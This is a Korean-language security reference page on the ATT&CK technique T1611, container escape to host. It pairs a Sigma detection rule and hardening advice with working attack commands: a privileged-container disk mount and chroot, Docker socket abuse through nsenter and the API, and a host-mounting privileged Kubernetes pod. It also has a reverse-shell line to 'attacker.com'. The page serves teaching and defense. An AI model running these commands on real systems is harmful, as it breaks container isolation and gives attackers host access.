# T1611 — Escape to Host

## 개요

**TA0004 / T1611**  
컨테이너 환경에서 호스트 OS로 탈출하는 기법입니다. Privileged 컨테이너 설정, Docker 소켓 마운트, runc CVE 취약점 등을 악용하여 컨테이너 격리를 우회하고 호스트 시스템에 접근합니다.

---

## 동작 방식

1. 컨테이너 내부에서 탈출 가능한 조건 확인 (권한, 마운트, 소켓 등)
2. Privileged 모드, Docker 소켓 마운트, 호스트 디렉토리 마운트 등 취약한 설정 악용
3. 호스트 파일시스템 접근, 호스트 프로세스 실행
4. 컨테이너 오케스트레이션 환경(K8s)에서는 다른 노드로의 확산

**주요 탈출 벡터:**
- Privileged 컨테이너 (`--privileged` 플래그)
- Docker 소켓 마운트 (`/var/run/docker.sock`)
- 호스트 네임스페이스 공유 (`--pid=host`, `--network=host`)
- runc 취약점 (CVE-2019-5736)
- Dirty COW (CVE-2016-5195)

---

## 주요 커맨드 / 실습

### 컨테이너 권한 및 탈출 가능성 확인
```bash
# Capabilities 확인 (CapEff에 높은 권한이 있으면 탈출 가능)
cat /proc/self/status | grep Cap
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')

# Privileged 컨테이너 여부 확인
cat /proc/1/status | grep -i "seccomp\|cap"

# 마운트된 디바이스 확인
fdisk -l 2>/dev/null
ls /dev/sd*
```

### Privileged 컨테이너에서 호스트 디스크 마운트
```bash
# 호스트 디스크 마운트 후 chroot로 호스트 탈출
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# 호스트에서 리버스 셸 실행
chroot /mnt/host /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

### Docker 소켓 남용 (nsenter)
```bash
# Docker 소켓이 마운트된 경우
ls -la /var/run/docker.sock

# 호스트 PID 네임스페이스에서 명령 실행
docker run -it --rm --pid=host --privileged ubuntu nsenter -t 1 -m -u -i -n /bin/bash

# 또는 직접 API 호출
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
```

### Kubernetes Privileged Pod을 통한 탈출
```yaml
# privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
    command: ["/bin/bash", "-c", "chroot /host bash"]
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

```bash
kubectl apply -f privileged-pod.yaml
kubectl exec -it escape-pod -- bash
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Privileged Container Execution Detected
id: 7a3e89f5-12b4-4d5c-8a23-1e4f9c7b2d6e
status: experimental
description: Detects execution of privileged Docker containers which may indicate container escape attempts
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: EXECVE
        a0: 'docker'
        a1: 'run'
        CommandLine|contains: '--privileged'
    condition: selection
falsepositives:
    - Legitimate administrative container operations
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1611
```

---

## 대응 방안

1. Privileged 컨테이너 실행 금지 (OPA Gatekeeper / Kyverno 정책 적용)
2. Docker 소켓(`/var/run/docker.sock`) 컨테이너 마운트 금지
3. Falco를 통한 런타임 이상 행위 탐지
4. Seccomp 프로파일 적용으로 시스템 콜 제한
5. AppArmor / SELinux 정책 적용
6. 컨테이너 이미지 취약점 스캔 (Trivy, Anchore)
7. 최소 권한 Capabilities 설정 (`--cap-drop=ALL --cap-add=필요한것만`)

---

## 참고자료
- [MITRE ATT&CK T1611](https://attack.mitre.org/techniques/T1611/)
- [Aqua Security - Container Escape Techniques](https://www.aquasec.com/cloud-native-academy/container-security/container-escape/)
- [Falco GitHub](https://github.com/falcosecurity/falco)
- [CVE-2019-5736 - runc 취약점](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
